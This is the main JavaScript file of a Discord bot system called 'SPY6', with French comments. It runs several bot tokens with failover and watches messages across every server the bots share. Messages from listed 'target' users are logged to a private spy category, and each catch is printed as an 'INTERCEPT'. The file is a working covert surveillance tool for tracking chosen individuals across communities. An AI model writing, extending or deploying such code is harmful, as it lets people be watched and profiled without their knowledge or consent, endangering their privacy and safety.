require('dotenv').config();

const {
  Client,
  GatewayIntentBits,
  ActivityType
} = require('discord.js');
const { loadState, saveState } = require('./src/state');
const { registerCommandsForGuild, handleInteraction } = require('./src/commands');
const { targetMatchesMessage, sendTargetLog, grantTargetReadAccess } = require('./src/spyManager');

const tokens = String(process.env.BOT_TOKENS || '')
  .split(',')
  .map(v => v.trim())
  .filter(Boolean);

if (!tokens.length) {
  console.error('❌ Aucun token. Copie .env.example vers .env puis remplis BOT_TOKENS.');
  process.exit(1);
}

const state = loadState();
const botRecords = [];
const seenMessages = new Map();
let activeClient = null;
let commandClient = null;

function getActiveClient() {
  if (activeClient?.isReady()) return activeClient;
  activeClient = botRecords.find(r => r.client?.isReady())?.client || null;
  return activeClient;
}


async function grantSetupAccess(client) {
  if (!client?.isReady() || !state.setupGuildId || !state.categoryId) return;
  if (!client.guilds.cache.has(state.setupGuildId)) return;
  try {
    const guild = client.guilds.cache.get(state.setupGuildId);
    const category = guild.channels.cache.get(state.categoryId)
      || await guild.channels.fetch(state.categoryId).catch(() => null);
    if (!category) return;
    await category.permissionOverwrites.edit(client.user.id, {
      ViewChannel: true,
      SendMessages: true,
      EmbedLinks: true,
      ManageWebhooks: true,
      ManageChannels: true
    });
  } catch (err) {
    console.error(`⚠️ Accès logs ${client.user?.tag || 'bot'} :`, err.message);
  }
}

function cleanupSeen() {
  const now = Date.now();
  for (const [id, ts] of seenMessages.entries()) {
    if (now - ts > 10 * 60 * 1000) seenMessages.delete(id);
  }
}
setInterval(cleanupSeen, 60_000).unref();

async function promoteIfNeeded() {
  const previous = activeClient;
  activeClient = botRecords.find(r => r.client?.isReady())?.client || null;

  if (activeClient && previous !== activeClient) {
    console.log(`⚡ BOT ACTIF → ${activeClient.user.tag}`);
  }

  // Un seul bot expose les slash commands pour éviter les doublons visuels.
  if (!commandClient?.isReady()) {
    commandClient = activeClient;
    if (commandClient) {
      for (const guild of commandClient.guilds.cache.values()) {
        await registerCommandsForGuild(commandClient, guild);
      }
    }
  }
}

async function onMessage(record, message) {
  if (!message.guild || message.author?.bot || message.webhookId) return;
  if (!getActiveClient() || record.client !== getActiveClient()) return;
  if (seenMessages.has(message.id)) return;
  seenMessages.set(message.id, Date.now());

  // Ne journalise pas les messages postés dans la catégorie SPY6 LOGS.
  if (state.categoryId && message.channel?.parentId === state.categoryId) return;
  if (!state.targets.length || !state.setupGuildId || !state.categoryId) return;

  for (const target of state.targets) {
    if (!targetMatchesMessage(target, message)) continue;
    try {
      await sendTargetLog({
        message,
        target,
        state,
        clients: botRecords,
        saveState,
        activeClient: getActiveClient()
      });
      console.log(`⌬ INTERCEPT // ${target.username || target.userId} // SOURCE ${message.author.tag} // ${message.guild.name}`);
    } catch (err) {
      console.error(`❌ Log ${target.userId}:`, err.message);
    }
  }
}

function createBotRecord(token, index) {
  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMembers,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent
    ]
  });

  const record = {
    index,
    client,
    status: 'connecting',
    lastError: null,
    lastTag: null
  };

  client.once('ready', async () => {
    record.status = 'online';
    record.lastError = null;
    record.lastTag = client.user.tag;
    client.user.setPresence({
      activities: [{ name: 'CLASSIFIED OPERATIONS', type: ActivityType.Watching }],
      status: 'online'
    });
    console.log(`🟢 BOT #${index + 1} connecté : ${client.user.tag}`);
    await grantSetupAccess(client);
    await promoteIfNeeded();
  });

  client.on('guildCreate', async guild => {
    if (guild.id === state.setupGuildId) await grantSetupAccess(client);
    if (client === commandClient) await registerCommandsForGuild(client, guild);
  });

  client.on('interactionCreate', async interaction => {
    if (client !== commandClient) return;
    try {
      await handleInteraction({
        interaction,
        state,
        saveState,
        botRecords,
        getActiveClient
      });
    } catch (err) {
      console.error('❌ Interaction :', err);
      const payload = { content: '❌ Une erreur interne SPY6 est survenue.', ephemeral: true };
      if (interaction.deferred || interaction.replied) await interaction.editReply(payload).catch(() => null);
      else await interaction.reply(payload).catch(() => null);
    }
  });

  client.on('guildMemberAdd', async member => {
    if (record.client !== getActiveClient()) return;
    if (!state.setupGuildId || member.guild.id !== state.setupGuildId) return;
    const target = state.targets.find(t => t.userId === member.id);
    if (!target) return;
    try {
      const granted = await grantTargetReadAccess(member.guild, target);
      if (granted) console.log(`👁️ Accès lecture seule accordé à ${member.user.tag} → salon SPY6`);
    } catch (err) {
      console.error(`⚠️ Accès cible ${member.id}:`, err.message);
    }
  });

  client.on('messageCreate', message => onMessage(record, message));

  client.on('shardDisconnect', async event => {
    record.status = 'offline';
    record.lastError = `Gateway fermé (${event?.code ?? '?'})`;
    console.log(`🔴 BOT #${index + 1} déconnecté`);
    if (activeClient === client) activeClient = null;
    if (commandClient === client) commandClient = null;
    await promoteIfNeeded();
  });

  client.on('shardReconnecting', () => {
    record.status = 'reconnecting';
  });

  client.on('shardResume', async () => {
    record.status = 'online';
    record.lastError = null;
    await promoteIfNeeded();
  });

  client.on('error', err => {
    record.status = client.isReady() ? 'online' : 'error';
    record.lastError = err.message;
    console.error(`❌ BOT #${index + 1}:`, err.message);
  });

  return record;
}

(async () => {
  console.log('');
  console.log('╔══════════════════════════════════════╗');
  console.log('║   SPY6 // INTELLIGENCE NETWORK v4   ║');
  console.log('╚══════════════════════════════════════╝');
  console.log(`⚡ ${tokens.length} token(s) de bot configuré(s)`);
  console.log('');

  for (let i = 0; i < tokens.length; i++) {
    const record = createBotRecord(tokens[i], i);
    botRecords.push(record);
    try {
      await record.client.login(tokens[i]);
    } catch (err) {
      record.status = /token/i.test(err.message) ? 'invalid' : 'error';
      record.lastError = err.message;
      console.error(`🔴 BOT #${i + 1} non connecté : ${err.message}`);
    }
  }

  await promoteIfNeeded();
})();
